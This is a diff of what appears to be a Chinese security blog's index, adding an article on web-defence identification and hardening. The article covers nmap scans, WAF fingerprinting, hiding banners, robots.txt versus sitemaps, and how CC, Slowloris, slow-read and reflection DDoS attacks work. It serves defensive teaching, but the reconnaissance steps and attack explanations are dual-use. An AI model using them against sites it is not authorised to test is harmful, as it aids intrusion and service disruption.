-<p>3）<strong>利用各类Web扫描器对站点进行漏洞扫描，并根据扫描结果进行定向漏洞修复或功能加固。</strong>针对无法扫描的漏洞，建议根据第一部分的漏洞防护原理进行手工测试，实现针对站点的基础漏洞加固。</p>
-<p>4）在完成上述流程之后，<strong>推荐采用各类Web防护设备来构建安全防护体系。</strong>以上三步在测试过程中如果有防护设备，会对安全检查效果造成干扰，因此推荐最后部署。部署时需要详细调整防护设备的规则，以适应站点的特性。</p>
-<p><strong>适度安全防护</strong>是安全防护策略中必须要考虑的因素，如何平衡安全防护投入与产出比非常关键。最后，要整体提升站点安全，避免出现木桶效应，方可实现针对系统的有效运行保障。</p>
-]]></content>
-      <categories>
-        <category>《WEB安全基础》</category>
-        <category>防护识别</category>
-      </categories>
-      <tags>
-        <tag>《WEB安全基础》</tag>
-        <tag>防护识别</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>用户视角下的信息探测</title>
     <url>/2023/06/11/%E7%94%A8%E6%88%B7%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B/</url>
     <content><![CDATA[<h1 id="1-whois信息"><a href="#1-whois信息" class="headerlink" title="1.whois信息"></a>1.whois信息</h1><p>首先，获得了域名。比如<a href="http://www.baidu.com./">www.baidu.com。</a></p>
@@ -14578,6 +14391,193 @@
       <tags>
         <tag>《WEB安全基础》</tag>
         <tag>信息探测</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web防护及识别</title>
+    <url>/2023/06/11/%E7%94%A8%E6%88%B7%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E9%98%B2%E6%8A%A4%E6%89%8B%E6%AE%B5%E8%AF%86%E5%88%AB/</url>
+    <content><![CDATA[<p>标准的防护方案为从硬件层面利用防火墙封锁高危IP、利用WAF设备在线阻断攻击，或者在Web服务器上开启防火墙、部署相关防护策略等。</p>
+<p>大部分防护手段对攻击的防护效果良好，如各类硬件WAF、各类云WAF、服务器防护软件等。</p>
+<p>在用户视角下进行防护手段的识别，可更有效地发现当前系统的隐藏威胁。</p>
+<h1 id="1-开放端口及对应业务识别"><a href="#1-开放端口及对应业务识别" class="headerlink" title="1.开放端口及对应业务识别"></a>1.开放端口及对应业务识别</h1><p>kali利用nmap对特定ip扫描端口，可以找到一些<strong>open状态的</strong>端口。</p>
+<p>遇到一些是<strong>filtered状态</strong>的端口呢，说明是开放的，但成为阻断状态，说明目标主机不仅限于有防火墙，各类防护软件、配置规则等都能形成filtered的效果。</p>
+<blockquote>
+<p>扫描开放端口的目的在于寻找可与目标服务器交互的点，并且了解目标的具体功能。在进行内网渗透时，这些被防火墙过滤的端口在内网中便可被使用。因此，扫描端口的作用非常多，并可有效扩展攻击目标。</p>
+</blockquote>
+<h1 id="2-是否有防护类软件"><a href="#2-是否有防护类软件" class="headerlink" title="2.是否有防护类软件"></a>2.是否有防护类软件</h1><p>1）直接<strong>利用错误参数打开目标站点的报错页面</strong>。例如，安全狗、360云防护等会在报错页面留有明确信息或特征。这些特征基本上无法修改，并且部分防护软件还会在报错页面中添加广告信息等，这都算是防护软件的一种标识。</p>
+<p>2）<strong>利用NMAP扫描目标站点，查看是否有已开放但被过滤的端口</strong>。如存在这样的端口，基本上可判定服务器前面会有防火墙。如果端口被防火墙过滤，那么此端口在外部无法直接利用。但事无绝对，假设内网数据库服务器开放3306端口并在防火墙处被过滤，则攻击者如果对此网络中任意一台设备成功渗透，就可以在内网利用3306端口开展连接等。</p>
+<p>3）<strong>利用Burpsuite抓取与目标系统通信的响应包，观察HTTP包头的server参数，看是否有WAF相关标识。</strong></p>
+<p>4）<strong>利用目录爆破工具，并从低速逐步升到高速，查看哪些阶段被封锁</strong>。一个没有添加防护设备或防护策略的站点并不会阻拦来自互联网的访问行为。设置安全设备或安全策略时都会考虑针对DDoS攻击的防护，会对来自同一地址的访问频率进行限制。因此<strong>逐步提升访问效率，即可测试出目标站点的阈值</strong>。可利用工具进行测试，</p>
+<h2 id="防护总结"><a href="#防护总结" class="headerlink" title="防护总结"></a>防护总结</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618200336378.png"></p>
+<blockquote>
+<p>搜索结果的 “banner” 是指在网络设备（如服务器、路由器、摄像头等）的响应中返回的特定信息。这些信息通常包含了设备的详细描述、设备型号、软件版本、协议信息等。通过分析设备返回的 banner 信息</p>
+</blockquote>
+<h1 id="3-常用防护方案"><a href="#3-常用防护方案" class="headerlink" title="3.常用防护方案"></a>3.常用防护方案</h1><p>在设计整体防护方案时，大多数人的直观想法是尽可能消灭漏洞。</p>
+<p>但在实际安全防护工作中，由于Web开发人员对安全的理解不足、运维人员的安全技术能力稍弱等因素，均会造成无法在第一时间发现漏洞并将其消除。</p>
+<p>漏洞会随着攻防技术发展不断涌现，而且公司的渗透测试和代码审计服务价格不菲。因此，在设计方案时，必须考虑“适度防护”。</p>
+<p>适度防护的原则是：<strong>建立防护手段，使攻击者的攻击代价（时间成本等）大于攻击成功后的价值</strong>，这样可使攻击者主动放弃攻击目标，从而达到较好的防护效果。</p>
+<h2 id="1-整体防护思路"><a href="#1-整体防护思路" class="headerlink" title="1.整体防护思路"></a>1.整体防护思路</h2><p>考虑整体方式思路时，最优的手段并不是增加大量防护工具或软件，而是先识别攻击者能连接过来的路径及攻击者可看到的信息。</p>
+<p>从攻击者的角度考虑，如果要针对一个系统开展攻击，必须先识别攻击目标的基本特征。对于Web网站来说，其基本特征包含以下几项：</p>
+<blockquote>
+<p>·目标的端口号（确认攻击目标有哪些）。</p>
+<p>·目标中间件及服务的版本（针对版本寻找可用漏洞）。</p>
+<p>·目标是否有明显漏洞等信息。</p>
+</blockquote>
+<p>可见，在防护阶段应尽可能减少有效信息的暴露，这样会极大增加攻击者的攻击难度，明显提升网站的防护效果。</p>
+<h2 id="2-简单防护方案"><a href="#2-简单防护方案" class="headerlink" title="2.简单防护方案"></a>2.简单防护方案</h2><p>中小Web站点的管理人员技术实力有限，无法做到从Web网站代码层面发现漏洞并进行防护。因此，作为中小站点的管理人员，应首先考虑降低当前站点对外提供服务时可被获取有效信息的可能性，并且及时地停用高危服务或端口。再利用漏扫工具扫一遍，查漏补缺。</p>
+<h3 id="1-关闭或修改服务器开放端口"><a href="#1-关闭或修改服务器开放端口" class="headerlink" title="1.关闭或修改服务器开放端口"></a>1.关闭或修改服务器开放端口</h3><p>Web服务器会利用HTTP（TCP80）、HTTPS（TCP443）协议为用户提供Web访问服务。</p>
+<p>除了有特殊端口提供服务，非必要开放端口尽量关闭，如FTP（21）、SSH（22）等。</p>
+<p>如果涉及特殊业务系统必须要<strong>开启特殊端口，建议采用防火墙、iptables等限制非业务端口的连接IP地址</strong>，即利用<strong>白名单技术实现访问控制</strong>，从而尽可能减少外部链接通道。</p>
+<p>针对特殊Web应用环境，如单一IP要实现多个Web应用共存，由于每个Web应用均需要一个独立的TCP端口，因此在这个过程中会涉及非默认端口的情况。针对这种情况，建议将端口设置成为<strong>非常见的端口</strong>。这样，NMAP在利用默认参数进行扫描时就不会发现修改过的端口，也就能避免特定应用被攻击者发现。需要注意的是，如果修改了http&#x2F;https的默认端口，那么后续在访问站点时需要在域名后面添加端口号，如<a href="http://www.xxx.com:30303。访问时添加端口号会给一般用户带来一定的困扰，**因此推荐在各类在线维护系统或内部系统使用**，并且这类系统通常较为敏感及重要，更建议隐藏端口。">http://www.xxx.com:30303。访问时添加端口号会给一般用户带来一定的困扰，**因此推荐在各类在线维护系统或内部系统使用**，并且这类系统通常较为敏感及重要，更建议隐藏端口。</a></p>
+<p>以常见的端口扫描工具NMAP为例，执行如下命令：</p>
+<p><code>#nmap -sS 192.168.1.1</code></p>
+<p>实现的效果是利用SYN对目标进行半开链接扫描。在执行上述命令时，NMAP默认扫描端口是：1～1024端口及NMAP中nmap-services（nmap主目录里面）文件里的端口列表。</p>
+<p>如果配置文件不设置的话，就是默认配置。</p>
+<p>当然了，如果没发现目标端口</p>
+<p><code>nmap -p0-65535 192.168.211.129</code> 扩大端口量即可</p>
+<p><strong>全端口扫描</strong>的时间大约是标准扫描时间的20倍左右。在实际场景中，攻击者会大范围开展扫描。<strong>考虑到扫描速度，基本会采用NMAP的默认端口开展扫描</strong>（全端口扫描会显著降低扫描速度）。</p>
+<blockquote>
+<p><strong>因此，推荐将非HTTP&#x2F;HTTPS默认端口的Web网站（如各类管理后台页面、管理地址等）修改为非NMAP默认端口号，可有效降低被发现的概率。</strong></p>
+</blockquote>
+<h3 id="2-利用防护类工具"><a href="#2-利用防护类工具" class="headerlink" title="2.利用防护类工具"></a>2.利用防护类工具</h3><p>目前，常用的防护类工具分为软件、硬件两种。其中，<strong>硬件</strong>防护工具价格<strong>较贵</strong>，<strong>软件</strong>防护工具<strong>有免费版</strong>可供选择。由于Web站点的独立性，每个站点均有其独特的应用场景及业务流程，这就要求安全工具在配置完毕后需按照Web站点进行相应的规则配置。安全产品及工具如果配置得当，会产生良好的防护效果，<strong>如果仅采用默认配置，则通常只有事倍功半的结果。</strong></p>
+<blockquote>
+<p>针对中小用户，在没有独立机房的情况下可考虑利用各类<strong>在线云WAF</strong>进行防护，或者<strong>部署相关软件</strong>（如安全狗均可），这类工具安装简便且防护效果良好，<strong>再配合各类webshell查杀工具</strong>定期对Web目录进行检查，即可有效提升站点的安全性。</p>
+</blockquote>
+<p>如果Web站点部署在各类云平台上，那么可利用云平台提供的防护类工具开展针对性的安全检查。这类工具的费用及效果均可满足中小企业的需求。例如，阿里云上提供应用安全工具，可按照需求购买，成本非常低。</p>
+<p>但需注意的是，<strong>安全产品内置的防护规则在默认状态下并不完全适合各类型Web站点。</strong>这主要是由于站点的架构及功能特点各不相同而导致的。例如，对于一个技术论坛，其中会针对各类代码进行讨论，这是此站点的正常业务行为，但由于大量含有代码的讨论内容会被防护设备识别成攻击，反而带来不便。因此，在防护类工具选择上，是否购买是一个问题，但如何更好地发挥防护类工具及自定义规则设置是另一个需要考虑的因素。</p>
+<h3 id="3-采用成熟的CMS系统"><a href="#3-采用成熟的CMS系统" class="headerlink" title="3.采用成熟的CMS系统"></a>3.采用成熟的CMS系统</h3><p>成熟的CMS在整体防护策略及安全性方面更加完善。</p>
+<p>有针对各类基础漏洞的防护方法、针对用户传参的参数化查询或者转义架构等。</p>
+<p>当然了，一般格式高度统一，对用户个性化有影响。目前主流的CMS已具备良好的二次开发能力了。</p>
+<h2 id="3-提升安全性的基础手段"><a href="#3-提升安全性的基础手段" class="headerlink" title="3.提升安全性的基础手段"></a>3.提升安全性的基础手段</h2><p>从技术原理上说，仅通过防护类软件，并不一定能完全实现漏洞防护，更不能实现业务层面的逻辑漏洞的防护。因此，最佳手段是在服务器层面提升防护效果等。在了解漏洞的原理之后思考，是否可以<strong>从开始就对漏洞的痕迹进行隐藏</strong>、从开始就对漏洞进行<strong>掩饰</strong>，以<strong>提升攻击者的攻击成本</strong>。</p>
+<h3 id="1-隐藏Web服务器的banner"><a href="#1-隐藏Web服务器的banner" class="headerlink" title="1.隐藏Web服务器的banner"></a>1.隐藏Web服务器的banner</h3><p>在各类应用中，常用<strong>banner信息</strong>来表示<strong>某项中间件或操作系统的特征，其中包含类型（Apache、Tomcat、nginx等）、版本号等信息</strong>。这些信息在渗透测试中非常有价值，主要体现在在特定中间件或操作系统版本上会存在各类已知的高危漏洞。当攻击者获取其对应的版本信息之后，可根据版本信息寻找有效的攻击方式。</p>
+<p>查看banner信息的好处在于，可以根据对应的版本信息寻找其对应的版本漏洞，常见的有以下几种：</p>
+<p><strong>·Apache：存在解析漏洞，range畸形包可导致DDoS攻击。</strong></p>
+<p><strong>·PHP：5.3.4版本之前存在%00截断。</strong></p>
+<p>攻击者获得目标服务器的banner信息方式为：</p>
+<blockquote>
+<p>1.利用NMAP进行扫描</p>
+<p><code>nmap –sV –Pn &#39;target IP&#39;</code></p>
+</blockquote>
+<blockquote>
+<p>2.利用非正常页面查看banner信息</p>
+<p>中间件的默认页面在没有修改的情况下，其返回的页面中会包含对应的banner信息。以常见的404页面为例，利用错误路径触发目标站点显示404页面，就可看到其中的服务器banner。</p>
+</blockquote>
+<blockquote>
+<p>3.抓取服务器response包一样会有服务器信息</p>
+<p>见bp抓的响应包中的server。</p>
+</blockquote>
+<p>目前各类浏览器及Web应用并不需要知道服务器的banner信息，因此可考虑将其关闭或删除。</p>
+<p>几个中间件的banner修改方案如下：</p>
+<h4 id="（l）修改Apache-banner"><a href="#（l）修改Apache-banner" class="headerlink" title="（l）修改Apache banner"></a>（l）修改Apache banner</h4><blockquote>
+<p>关闭版本号显示的方法如下：</p>
+<p>1）找到&#x2F;etc&#x2F;apache2&#x2F;apache2.conf或&#x2F;etc&#x2F;apache2&#x2F;httpd.conf（根据相应的Linux发行版选择）。</p>
+<p>2）找到项目，将ServerSignature on改为ServerSignature off。</p>
+<p>3）找到项目，将ServerTokens Full改为ServerTokens prod。</p>
+</blockquote>
+<p>以上两项均需修改，如果部分Apache版本的配置文件中没有上述配置，那么直接在http.conf中添加上述两行配置即可。</p>
+<p>修改完成之后重新进行检查。先利用Burpsuite抓包，可发现在response中已不显示版本情况。</p>
+<p>如果要替换banner名称为专有，可编辑<strong>ap_release.h文件</strong>，方法如下：修改<code>&quot;#define AP_SERVER_BASEPRODUCT&quot;Apache&quot;&quot;为&quot;#define AP_SERVER_BASEPRODUCT&quot;Microsoft-IIS/7.0&quot;</code>。这是一种欺骗的方法，能有效迷惑攻击者。毕竟Apache中怎么也不会存在IIS的漏洞，如果攻击者根据修改后的banner进行大量攻击尝试，也不会产生任何安全威胁。</p>
+<h4 id="（2）PHP版本号关闭"><a href="#（2）PHP版本号关闭" class="headerlink" title="（2）PHP版本号关闭"></a>（2）PHP版本号关闭</h4><blockquote>
+<p>关闭PHP版本号的方法为打开php.ini配置文件，找到expose_php On项目，将其修改为expose_php off即可。</p>
+<p>修改完毕后可重新抓取response包，发现X-Powered-By中的PHP版本号已消失，</p>
+</blockquote>
+<h4 id="（3）修改Nginx-Banner"><a href="#（3）修改Nginx-Banner" class="headerlink" title="（3）修改Nginx Banner"></a>（3）修改Nginx Banner</h4><blockquote>
+<p>修改Nginx配置中的相关项目，方法与Apache的方式类似。修改Server_tokens的值为off。修改后的效果类似Apache。</p>
+</blockquote>
+<h4 id="（4）修改系统默认TTL"><a href="#（4）修改系统默认TTL" class="headerlink" title="（4）修改系统默认TTL"></a>（4）修改系统默认TTL</h4><p>用以下命令修改Red Hat Linux的TTL基数为128（默认为64）：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;echo 128 &gt; /proc/sys/net/ipv4/ip_default_ttl</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;net.ipv4.ip_default_ttl = 128</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>修改版本号只是提高了攻击者的攻击时间成本，有效的防护措施依然是对现有漏洞进行发现和处理。不过由于攻击时间长，可为系统管理员争取一段发现时间，因此定期观察系统日志或利用各类防护系统观察攻击行为，也可尽早发现攻击者并采取后续处理措施。</p>
+<h3 id="2-robots-txt"><a href="#2-robots-txt" class="headerlink" title="2.robots.txt"></a>2.robots.txt</h3><p>Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除协议”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取、哪些页面不能抓取。</p>
+<blockquote>
+<p>当一个搜索引擎的爬虫访问站点时，它会首先检查该站点的根目录下是否存在robots.txt，如果该文件存在，搜索机器人就会按照该文件中的内容来确定访问的范围；<strong>如果该文件不存在</strong>，所有的搜索引擎的爬虫将能够访问网站上所有没有被口令保护的页面。因此建议，<strong>仅当网站包含不希望被搜索引擎收录的内容时，才使用robots.txt文件</strong>；如果希望搜索引擎收录网站上所有内容，则不要建立robots.txt文件。</p>
+</blockquote>
+<p>使用robots.txt的好处在于，可清晰告知搜索引擎的爬虫哪些页面不能被收录，哪些页面可以被收录，从而避免敏感文件被访问。但是，robots.txt本身可以公开访问（搜索引擎的爬虫为公开环境），攻击者只需观察robots.txt里面的内容，也可能发现有效的内容。</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618222437042.png" alt="robots.txt文件样例"></p>
+<p>利用disallow的方式可理解为黑名单的方式，甚至可以直接告知攻击者，哪些连接我是不想让搜索引擎收录的。</p>
+<p>为了解决这个问题，建议将传统的robots.txt替换为sitemap。目前主流搜索引擎均支持sitemap。sitemap也叫做网站XML地图，用以格式化地标注网站的整体结构。</p>
+<p>例如，百度支持三种sitemap格式：txt文本格式、xml格式、sitemap索引格式。目前常用的为xml格式。</p>
+<p>以上海移动网上营业厅（<a href="http://www.sh.10086.cn)为例,其主目录下的robots.txt/">www.sh.10086.cn）为例，其主目录下的robots.txt</a></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618222651935.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent：*</span><br><span class="line">Disallow：</span><br></pre></td></tr></table></figure>
+
+<p>表示允许一切搜索引擎的爬虫爬取网站信息。</p>
+<p>接下来，用sitemap告知搜索引擎，该站的网站地图连接在哪里，直接读取此xml文件即可获得网站的结构。</p>
+<p><strong>其优点在于利用sitemap告知了搜索引擎爬虫网站可公开的结构有哪些，其余的信息不能被爬取。</strong>这相当于实现了白名单的效果，从而很好地规避了传统写法的缺陷，值得推荐。</p>
+<h3 id="3-提升后台地址复杂度"><a href="#3-提升后台地址复杂度" class="headerlink" title="3.提升后台地址复杂度"></a>3.提升后台地址复杂度</h3><p>假设<strong>前台</strong>存在SQL注入漏洞，或者管理员用户及密码已经被攻击者掌握，那么攻击者希望找到目标站点的<strong>后台地址</strong>，以便开展后续攻击。如果后台地址无法被攻击者发现，那么攻击者空有之前成果，无法登录后台开展后续攻击。</p>
+<p>攻击者常用的寻找后台地址的方法就是利用搜索引擎，搜索admin相关的字眼，确认是否有后台等。</p>
+<p>在大部分情况下，利用搜索引擎并不能直接发现后台，这时攻击者常用的手段就是<strong>地址爆破</strong>。地址爆破的方法是拼接URL，URL由当前“域名+常用后台地址库”进行构造，再顺序访问构造后的URL是否存在，从而对目标网站的后台地址进行爆破。目录爆破类工具是利用<strong>已经定义的后台地址库进行重复尝试</strong>，并对成功返回的地址进行尝试，从而发现后台地址。</p>
+<p>作为网站所有者，<strong>基本的手段为加强后台地址复杂度</strong>，避免后台地址出现在攻击者的后台地址库中。常见的后台地址设计方案如下：</p>
+<blockquote>
+<p>1）将几组方便记忆的信息转换为MD5（可加SALT），再反序等；或者利用其他方式加强难度。方案可自行设计。这样做可显著提高攻击者爆破后台目录的时间成本。</p>
+<p>2）还有一种情况在一些早期网站中经常出现：即在前台页面中有一项进入后台管理的功能，这会直接导致当前站点的后台地址暴露。这也就是搜索引擎会将后台地址进行收录的原因。</p>
+</blockquote>
+<h2 id="4-DDoS攻击及防护方法"><a href="#4-DDoS攻击及防护方法" class="headerlink" title="4.DDoS攻击及防护方法"></a>4.DDoS攻击及防护方法</h2><p>分布式拒绝服务（Distributed Denial of Service，DDoS）攻击指利用<strong>多个节点</strong>，<strong>通过各类协议对目标发动大量链接或大流量行为</strong>，导致目标由于性能及带宽原因，无法有效处理来自攻击节点的各类访问请求，最终实现服务终止的情况。</p>
+<p>DDoS攻击无法造成服务器权限或数据的丢失，但会造成Web服务停止运行。</p>
+<h3 id="1-DDos主要攻击方式"><a href="#1-DDos主要攻击方式" class="headerlink" title="1.DDos主要攻击方式"></a>1.DDos主要攻击方式</h3><h4 id="1-传输层洪泛攻击"><a href="#1-传输层洪泛攻击" class="headerlink" title="1.传输层洪泛攻击"></a>1.传输层洪泛攻击</h4><p>自建的网站通常要租赁运营商带宽提供Web服务。在这种情况下，由于<strong>带宽有限</strong>，一旦出现DDoS攻击，就算在本地部署了抗DDoS攻击设备且防护效果非常好，也无法恢复正常的Web应用。</p>
+<p>这主要由于防护设备部署在Web服务器前端，但是运营商侧的链路早已被DDoS所<strong>阻塞</strong>死，导致正常流量一直无法达到Web服务器。</p>
+<blockquote>
+<p>就是说运营商分配的正常流量20mb&#x2F;s带宽，而，ddos的攻击流量就有200mb&#x2F;s，这就造成了堵塞</p>
+</blockquote>
+<h4 id="2-针对Web的应用层攻击"><a href="#2-针对Web的应用层攻击" class="headerlink" title="2.针对Web的应用层攻击"></a>2.针对Web的应用层攻击</h4><p>针对HTTP应用层面的攻击比较复杂，主要体现在危害性及其目标特点上。</p>
+<p>常见的DDoS攻击为<strong>CC攻击</strong>，其原理是利用代理服务器或肉鸡节点向Web服务器发起大量请求，造成服务器资源耗尽，达到服务终止的效果。相同类型的攻击还有HTTP GET FLOOG等。</p>
+<blockquote>
+<p>CC攻击（Challenge Collapsar，挑战黑洞）</p>
+</blockquote>
+<p>CC攻击原理是利用代理服务器的强大性能，同时针对单一目标发起大量的请求连接，造成目标系统短时间之内无法处理过多的连接数，进而失去响应。</p>
+<p>相对于4层的SYN&#x2F;ICMP等占用带宽的DDoS攻击而言，CC攻击主要是为了占用<strong>服务器的连接资源</strong>。虽然占用目的不同，但实现效果一样。在很多场景下，CC攻击常<strong>通过消耗目标服务器的性能</strong>来实现拒绝服务的效果。</p>
+<p>总之，<strong>针对Web的应用层攻击就是利用大量请求来消耗目标服务器的硬件资源，实现拒绝服务的目的。</strong>针对这类攻击，通过各类<strong>云WAF或者CDN</strong>可有效解决。</p>
+<h4 id="3-慢速连接攻击"><a href="#3-慢速连接攻击" class="headerlink" title="3.慢速连接攻击"></a>3.慢速连接攻击</h4><p>利用HTTP协议缺陷，伪造缺陷请求包，造成目标服务器中间件针对缺陷包的处理异常，从而实现服务器拒绝的效果，这类利用协议缺陷实现的攻击就叫做慢速连接攻击。</p>
+<p>特点是利用极低带宽即可实现DDoS攻击效果，相对于CC&#x2F;HTTP get flood攻击来说，其带宽占用极小。</p>
+<p>这种攻击主要有以下几种形式：</p>
+<blockquote>
+<p>（1）Slowloris攻击</p>
+<p>HTTP协议规定，HTTP Request以\r\n\r\n（0d0a0d0a）结尾表示客户端发送结束。</p>
+<p>攻击者在HTTP请求头中将Connection设置为Keep-Alive，要求Web服务器保持TCP连接不要断开，随后缓慢地每隔几分钟发送一个key-value格式的数据到服务器端，如a：b\r\n，导致服务器端认为HTTP头部没有接收完成而一直等待。</p>
+<p>如果攻击者使用多线程或者多节点来做同样的操作，<strong>服务器的Web的连接数量很快就被攻击者占满</strong>，导致无法接受新的TCP连接请求。</p>
+<p>kali自带一个slowhttptest工具</p>
+</blockquote>
+<p>正常http包结尾都是\r\n\r\n（0d0a0d0a），如果有一个包结尾是\r\n，也就是少了一组\r\n，会导致低版本中间件在接收到HTTP畸形包之后会一直保持连接打开的状态，进而实现链接占用，达到DDoS攻击的效果。</p>
+<blockquote>
+<p>（2）Slow HTTP POST</p>
+<p>为slowloris攻击的变种形式，利用POST的方式开展攻击。</p>
+<p>其核心思路是利用POST包允许在HTTP的头中声明content-length（POST包内容长度）的特点。具体原理为：在提交了相应的HTTP头以后，<strong>不发送HTTP包的body部分</strong>，导致服务器在<strong>接受了POST长度声明</strong>后会持续等待客户端发送POST的内容。假设攻击者保持连接并且以每隔10～100S一个字节的速度去发送，从而达到消耗Web服务器连接资源的效果。因此，不断地增加这样的链接，就会使得服务器的资源被消耗，最后导致拒绝服务的效果。</p>
+</blockquote>
+<blockquote>
+<p>（3）Slow Read Attack</p>
+<p>原理为通过<strong>调整TCP协议中的滑动窗口大小</strong>来对服务器单次发送的数据大小进行控制，使得服务器要<strong>将一个回应分成很多个包发送</strong>。要使这种攻击效果更加明显，请求的资源应尽量大。</p>
+</blockquote>
+<p>总体来说，DDoS攻击的简单、暴力特性，导致即使在服务器端添加抗DDoS类设备<strong>也无法阻止各类带宽占用</strong>的情况。但是，可以根据业务特定适当调优，<strong>提升中间件版本</strong>，避免Web应用层攻击和各类慢速连接攻击带来的危害。目前大部分<strong>运营商或者IDC均提供在线的DDoS攻击流量清洗服务</strong>，防护效果良好，可根据实际情况选用。</p>
+<h4 id="4-反射型DDoS攻击"><a href="#4-反射型DDoS攻击" class="headerlink" title="4.反射型DDoS攻击"></a>4.反射型DDoS攻击</h4><p>(Distributed Reflection Denial of Service，DRDOS)的主要特点是利用互联网公共服务（如DNS、NTP等）实现。</p>
+<p>攻击者将要<strong>攻击的目标伪造成查询发起方</strong>，<strong>并发送给这些公共服务</strong>。公共服务接收到请求包后，将查询结果返回到被攻击目标上。因此在大量伪造请求发起后，被攻击方会接收到大量的查询结果，导致链路严重阻塞，产生拒绝服务的效果。</p>
+<p>反射型DDoS攻击的特点在于可利用<strong>非常小的流量</strong>实现针对目标的<strong>超大流量DDoS攻击</strong>，因此，其<strong>攻击成本非常低</strong>，且带宽阻塞效果显著。由于攻击流量的实际发起方为互联网公共服务，且带宽阻塞无法通过本地的设备进行防护（主要是由于运营商侧的带宽已经占满），其危害也非常严重。目前基于DNS服务、NTP服务、Web服务等都能实现这类效果。从被攻击端观察攻击特点，会发现这非常类似于传输层的DDoS攻击。</p>
+<p>反射型DDoS攻击实施简单，效果良好，且对攻击方的带宽占用非常低，因此使用频率非常高。作为防御者，<strong>针对带宽占用</strong>，解决方案是利用运营商链路的<strong>流量清洗</strong>或者各类云平台的清洗服务。仅在系统前端部署防护类攻击基本无效果，这一点需要注意。</p>
+<h4 id="5-如何解决DDoS攻击问题"><a href="#5-如何解决DDoS攻击问题" class="headerlink" title="5.如何解决DDoS攻击问题"></a>5.如何解决DDoS攻击问题</h4><p>为DDoS虽然不会对服务器的权限产生影响，但DDoS攻击直接会导致Web服务器失效，也就是业务停用，这对Web服务的可靠性造成极大影响，特别是会影响客户对网站的信任。因此，DDoS这种暴力破坏业务可用性的攻击手段因其简单粗暴性决定了其流行程度。</p>
+<p>主要是<strong>利用TCP协议实现大量的链接</strong>，或者利用HTTP应用等实现GET FLOOD、CC攻击等。从攻击原理上说，可利用SYN、ACK、FIN三种TCP的协议规范进行DDoS攻击。</p>
+<p>在防护DDoS攻击方面，标准的防护方式就是<strong>统计来自同一目标的请求频率及特点</strong>，并根据业务特点<strong>设定阈值</strong>。比如针对<strong>同一IP</strong>，每秒监测的SYN包阈值可设定为8000，那么当SYN包超过8000时，就将其丢弃，具体丢弃方法根据业务特点而定。比如，全部丢弃可实现针对单一IP的一段时间禁封；也可对超过阈值的部分进行丢弃，只允许阈值内的包通过。</p>
+<p>这里有一个问题需要说明。在判断DDoS的危害方面，<strong>最为科学的指标为pps数（即每秒接收处理数据包数）</strong>，<strong>其次才是DDoS流量大小</strong>。因为在DDoS攻击中，若带宽相同，攻击者发送的攻击数据包越小，则对应单位流量下的数据包越多，即pps数越高时。由于各类设备针对数据包处理也有阈值，因此相应的防护系统处理DDoS攻击的难度就会越大。因此，常用的以Mbps来表示的DDoS攻击量，有时并不能客观体现DDoS攻击的强度。</p>
+<p><strong>在DDoS攻击防护方面，目前的抗拒绝服务攻击设备都能针对上述DDoS攻击提供较好的防护效果。</strong>运营商在其主干链路中也部署了大量的旁路抗拒绝服务攻击设备。运营商旁路部署抗拒绝服务攻击设备原理是利用动态路由协议特性实现的效果，将牵引设备添加到当前BGP路由表中。当牵引设备发现当前链路中出现DDoS攻击行为时，会通过将当前链路通过更新动态路由表的方式将流量牵引至抗DDoS设备，并在对DDoS攻击流量进行清洗后将正常流量汇注到当前网络内。</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619152154089.png" alt="抗DDoS系统旁路部署图"></p>
+<p><strong>在旁路部署时，如果出现DDoS攻击流量，防护设备对DDoS流量会进行自动牵引和清洗。</strong>这样做的好处在于整体过程对现有的传输不造成影响。由于在正常情况下流量不经过抗DDoS设备，因此不会对当前业务造成延迟，因而广泛用于各级运营商、各级骨干链路等。针对普通用户而言，旁路部署的意义不大，建议通过接口串联或者利用运营商或IDC提供的DDoS攻击清洗服务进行防御。</p>
+<p>总体来说，DDoS攻击的技术简单、粗暴，其目的在于破坏目标网站的业务可用性。虽然无法获得目标服务器的权限及数据，但是随着目前互联网在线应用的日益增多及用户针对Web系统的依赖性增强，导致DDoS的效果反而非常良好。目前国内各大云服务提供商或链路提供商均已提供<strong>在线防护或清洗服务</strong>，因此从防护角度来说不必太担心。但这种攻击行为始终会影响系统的正常工作，在未来，各类DrDos等攻击行为及技术仍然还会存在较长时间。</p>
+<h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h1><p>攻击者在针对一个<strong>Web系统开展攻击</strong>时，必须知道<strong>目标的基本信息及可通行的路径</strong>，否则就是在进行大量无意义的尝试。因些，从<strong>防御角度</strong>，建议利用各类<strong>Web扫描器配合人工检查</strong>，对现有业务系统进行全面的安全测试，</p>
+<p>总体来说，中小站点在安全防护的提升阶段可采用以下思路：</p>
+<p>1）<strong>隐藏站点的敏感信息，如各类端口、各类目录等</strong>。同时，利用各类搜索引擎在互联网上搜索站点的内容，尝试发现有价值的内容，并进行针对性处理。</p>
+<p>2）<strong>检查业务体系安全状况，隐藏后台地址，提升管理用户的密码强度或者限制登录范围等。</strong>同时，根据第二部分介绍的业务安全体系流程进行业务安全分析。</p>
+<p>3）<strong>利用各类Web扫描器对站点进行漏洞扫描，并根据扫描结果进行定向漏洞修复或功能加固。</strong>针对无法扫描的漏洞，建议根据第一部分的漏洞防护原理进行手工测试，实现针对站点的基础漏洞加固。</p>
+<p>4）在完成上述流程之后，<strong>推荐采用各类Web防护设备来构建安全防护体系。</strong>以上三步在测试过程中如果有防护设备，会对安全检查效果造成干扰，因此推荐最后部署。部署时需要详细调整防护设备的规则，以适应站点的特性。</p>
